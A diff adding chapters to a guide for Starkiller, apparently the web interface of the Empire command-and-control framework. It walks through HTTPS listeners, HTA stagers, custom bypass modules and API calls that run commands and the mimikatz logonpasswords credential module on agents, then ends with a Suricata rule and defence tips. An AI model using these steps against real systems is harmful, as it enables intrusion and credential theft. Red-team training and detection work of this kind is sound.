@@ -337,6 +337,152 @@ tail -f empire/logs/empire.log
 
 ---
 
+## Chapter 9: Real-World Scenarios
+
+### Red Team C2 Management
+
+```bash
+# 1. Start Empire server
+cd Empire && ./ps-empire server
+
+# 2. Access Starkiller at http://localhost:1337
+
+# 3. Create HTTPS listener
+# Listeners > Create > Type: http
+# Host: https://redirector.example.com
+# Port: 443
+# CertPath: /path/to/cert.pem
+
+# 4. Generate stager
+# Stagers > Select: windows/hta
+# Listener: http
+# Generate > Copy payload
+
+# 5. Once agent connects, manage from Starkiller
+# Agents > Click agent > Execute modules
+# Search: mimikatz > Configure > Execute
+
+# 6. Monitor activity
+# Events tab shows real-time activity
+# Dashboard shows agent statistics
+```
+
+### Multi-Operator Collaboration
+
+```bash
+# Multiple operators connect to same Empire server
+# All see the same agents, listeners, and events
+# Use the Agents tab to coordinate which operator handles which agent
+```
+
+### Custom Bypass Scripts
+
+```bash
+# In Empire, create a custom bypass module
+# Place in empire/data/misc/agent_bypass.ps1
+
+# In Starkiller:
+# Agents > Select agent > Bypasses > Enable custom bypass
+```
+
+### Graph View for Network Mapping
+
+```bash
+# Use the Graph view to visualize:
+# - Agent relationships
+# - Pivot paths
+# - Lateral movement routes
+# - Discovered network topology
+```
+
+---
+
+## Chapter 10: API Reference
+
+### Authentication
+
+```bash
+# Get API token
+curl -X POST http://localhost:1337/api/auth \
+  -H "Content-Type: application/json" \
+  -d '{"username":"empireadmin","password":"password123"}'
+
+# Response: {"token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..."}
+```
+
+### Listener Operations
+
+```bash
+# List listeners
+curl -H "Authorization: Bearer <token>" \
+  http://localhost:1337/api/listeners
+
+# Create listener
+curl -X POST -H "Authorization: Bearer <token>" \
+  http://localhost:1337/api/listeners \
+  -d '{"listenerType":"http","name":"mylistener","options":{"Host":"http://192.168.1.100:8080"}}'
+```
+
+### Agent Operations
+
+```bash
+# List agents
+curl -H "Authorization: Bearer <token>" \
+  http://localhost:1337/api/agents
+
+# Execute command
+curl -X POST -H "Authorization: Bearer <token>" \
+  http://localhost:1337/api/agents/<agent_name>/execute \
+  -d '{"command":"whoami"}'
+
+# Execute module
+curl -X POST -H "Authorization: Bearer <token>" \
+  http://localhost:1337/api/agents/<agent_name>/execute \
+  -d '{"module":"powershell/credentials/mimikatz/logonpasswords"}'
+```
+
+### Stager Operations
+
+```bash
+# Generate stager
+curl -X POST -H "Authorization: Bearer <token>" \
+  http://localhost:1337/api/stagers \
+  -d '{"stagerType":"multi/launcher","options":{"Listener":"mylistener"}}'
+```
+
+---
+
+## Chapter 11: Detection and Defense
+
+### Web Interface Security
+
+- HTTPS with strong TLS configuration
+- IP whitelisting for Starkiller access
+- Multi-factor authentication
+- Session timeout and logout
+- Audit logging of all API calls
+
+### Empire Traffic Detection
+
+```bash
+# Monitor for Empire C2 traffic
+# Suricata rule example
+alert http any any -> any any (msg:"Empire C2 Beacon"; \
+  http.method; http.host; \
+  content:"/admin/get.php"; \
+  sid:1000001; rev:1;)
+```
+
+### Defense Recommendations
+
+1. Monitor for HTTP(S) API calls to Empire endpoints
+2. Implement web application firewall rules
+3. Monitor for AMSI/ETW bypass attempts
+4. Deploy network traffic analysis for C2 detection
+5. Use certificate pinning for Starkiller access
+
+---
+
 ## Resources
 
 - **GitHub Repository:** https://github.com/BC-SECURITY/Starkiller
@@ -344,4 +490,17 @@ tail -f empire/logs/empire.log
 - **Empire Wiki:** https://bc-security.gitbook.io/empire-wiki/
 - **Starkiller Blog Post:** https://www.bc-security.org/post/an-introduction-to-starkiller
 - **MITRE ATT&CK - Command and Control:** https://attack.mitre.org/tactics/TA0011/
+- **MITRE ATT&CK - Application Layer Protocol:** https://attack.mitre.org/techniques/T1071/
 - **Related Tools:** PowerShell Empire, Metasploit Framework, Havoc
+
+---
+
+## Appendix: Keyboard Shortcuts
+
+| Shortcut | Action |
+|---|---|
+| `Ctrl+K` | Quick search |
+| `Ctrl+L` | Navigate to listeners |
+| `Ctrl+A` | Navigate to agents |
+| `Ctrl+M` | Navigate to modules |
+| `Esc` | Close modal/dialog |
